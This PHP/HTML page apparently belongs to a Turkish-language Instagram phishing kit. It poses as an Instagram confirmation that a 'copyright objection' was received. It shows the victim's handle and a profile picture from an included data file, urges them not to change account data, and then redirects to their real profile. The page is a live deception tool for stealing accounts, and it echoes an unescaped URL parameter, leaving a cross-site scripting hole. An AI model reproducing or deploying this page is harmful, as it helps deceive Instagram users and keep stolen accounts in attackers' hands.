<?php
   session_start();
   require 'data.php';

   $nick = $_GET["user"];   
   
   header("refresh:7;url=https://www.instagram.com/$nick");
   ?>
<html>
   <head>
      <title>Telif Hakkı Talebiniz Alındı @<?php echo $nick;?></title>
      <script src="https://www.google.com/recaptcha/api.js" async defer></script>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <script
         src="https://code.jquery.com/jquery-3.4.1.min.js"
         integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
         crossorigin="anonymous"
         ></script>
      <link
         href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
         rel="stylesheet"
         type="text/css"
         />
      <style>
         .button {
         width:220px;
         height:30px;
         margin-top:10px;
         outline:none;
         border:none;
         color:white;
         background:#3896f0;
         font-weight:bold;
         font-size:15px;
         margin-bottom:10px;
         border-radius:3px;
         }
         .button:disabled {
         opacity: 0.5;
         }
         .hide {
         display: none;
         }
      </style>
      <link rel="icon" href="img/favicon.png">
      <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
   <body>
      <br>
      <center>
      <main>
      <img src="<?php echo $pp ?>" style="max-width:35%; border-radius:50%;">
      <h3 color=darkblue class="h3">Telif Hakkı İtirazınız başarıyla gönderildi
         ✓
      </h3>
      <p color="red">Sayın; @<?php echo $nick;?>,</p>
      <p style="font-family:sans-serif;color:#555; width:89%;" >
         İtirazınız başarıyla alındı. Ekiplerimiz en kısa sürede size dönüş yapacaktır. Bu süre zarfında hesabınızda herhangi bir veri değişikliği yapmamanız önemlidir.
      </p>
      <img src="img/checkmark.gif" width="150" height="110"/>
      </div>
      <br>
      <center>
         <div class="dont" style="display:none;">
            <span class="dont1">Hesabınız yok mu? </span>
            <span class="dont2">Üye Olun</span>
         </div>
      </center>
      <center>
      <div id="menu">
      <font color="#b9b9b9">Hakkında</font>&nbsp;
      <font color="#c0c0c0">Blog</font>&nbsp;  
      <font color="#b9b9b9">Meslekler</font>&nbsp;  
      <font color="#b9b9b9">Yardım</font>&nbsp;  
      <font color="#b9b9b9">API</font>&nbsp;  
      <font color="#b9b9b9">Gizlilik</font> &nbsp;
      <font color="#b9b9b9">Şartlar</font>&nbsp;
      <br><br>		
      <font color="#b9b9b9">En İyi Hesaplar</font></a>&nbsp;
      <font color="#c0c0c0">Güzellik</font>&nbsp;  
      <font color="#c0c0c0">Hashtags</font>&nbsp;  
      <font color="#c0c0c0">Görsel Sanatlar</font>&nbsp;
      <br><br>
      <br><br>
      <center>
         <div class="bottom">
            <p class="big"></p>
         </div>
      </center>
   </body>
   <style type="text/css">
      *{font-family:sans-serif;}
      body{padding:0px;margin:0px;background:#fafafa}
      header{border-bottom:1px solid #cecece;
      background:white;
      padding-bottom:1px;
      padding-top:4px;}
      main{
      background:white;
      margin-top:20px;
      padding-top:20px;
      width:400px;
      max-width:90%;
      border:1px solid #dedede;
      }.h3{font-family:sans-serif;
      font-weight:400;
      color:#444;
      word-spacing:1px;
      }main p{
      font-family:sans-serif;
      color:#999;
      width:270px;
      }main input{
      transition:1s;
      box-shadow: -1px 1px 7px 1px #3896f0;
      border:none;
      width:180px;
      height:27px;
      outline:none;
      border:1px solid #cecece;
      padding-left:5px;
      font-size:15px;
      background:#fafafa;
      border-radius:4px;
      }main input::placeholder{
      font-size:15px;
      color:#999;
      }main .a_adaskpd{
      width:140px;
      height:30px;
      margin-top:10px;
      outline:none;
      border:none;
      color:white;
      background:#3896f0;
      font-weight:bold;
      font-size:15px;
      margin-bottom:10px;
      border-radius:3px;
      }main input:focus{
      box-shadow: 0px 0px 0px 0px white;
      border:1px solid #3896f0;
      }
      .other{
      margin-top:110px;
      bottom:0px;
      position:relative;
      width:100%;
      }
   </style>
</html>